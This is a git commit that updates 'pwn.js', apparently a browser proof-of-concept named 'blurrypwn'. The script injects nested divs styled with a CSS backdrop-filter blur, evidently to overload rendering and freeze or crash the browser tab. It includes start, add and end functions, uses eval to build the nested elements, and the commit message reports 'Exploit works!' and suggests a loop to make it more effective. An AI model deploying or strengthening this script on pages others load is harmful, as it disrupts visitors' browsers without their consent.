90c1a352b150bd0d3994a76dc3916696fe85dbd8
0neGuy <0neguybusiness@gmail.com>
2019-05-03 11:37:26 +0200

    Update pwn.js
    Exploit works!
    Execute pwn.add() a few times.
    Then pwn.start() and It'll work...
    
    BUTT It's pretty ineffective, an interval or some sort of loop would make it better ;)

--- pwn.js
+++ pwn.js
@@ -1,14 +1,45 @@
 var pwn = {
     divI: 0,
+    logging: true,
     start: function() {
-        pwn.divI++;
-        if (pwn.divI === 1) {
-            document.body.innerHTML += "<div id='" + pwn.divI + "'></div>";
+        if (!document.getElementById("pwnStyling")) {
+            document.body.innerHTML += "<style id='pwnStyling'>.pwnDiv {backdrop-filter:blur(50px)}</style>";
+            if (pwn.logging) {
+                console.log("%cblurrypwn: started exploit", "color:green")
+            }
         } else {
-            eval('document.getElementById(´' + pwn.divI + '´).innerHTML += "<div id=´" + pwn.divI + "´></div>";')
+            if (pwn.logging) {
+                console.log("%cblurrypwn: is already active", "color:red")
+            }
+        }
+        
+    },
+    add: function() {
+        if (pwn.divI < 1) {
+            if (pwn.logging) {
+                console.log("%cblurrypwn: added root div", "color:green")
+            }
+            pwn.divI++;
+            document.body.innerHTML += "<div class='pwnDiv' id='" + pwn.divI + "'></div>";
+        } else {
+            if (pwn.logging) {
+                console.log("%cblurrypwn: added new div", "color:green")
+            }
+            let morePwn = pwn.divI + 1;
+            eval('document.getElementById("' + pwn.divI + '").innerHTML += "<div class=pwnDiv id=" + morePwn + "></div>";')
+            pwn.divI++;
         }
     },
     end: function () {
-
+        if (!document.getElementById("pwnStyling")) {
+            if (pwn.logging) {
+                console.log("%cblurrypwn: is not active", "color:yellow")
+            }
+        } else {
+            if (pwn.logging) {
+                console.log("%cblurrypwn: stopped exploit", "color:green")
+            }
+            document.getElementById("pwnStyling").remove()
+        }
     }
 }
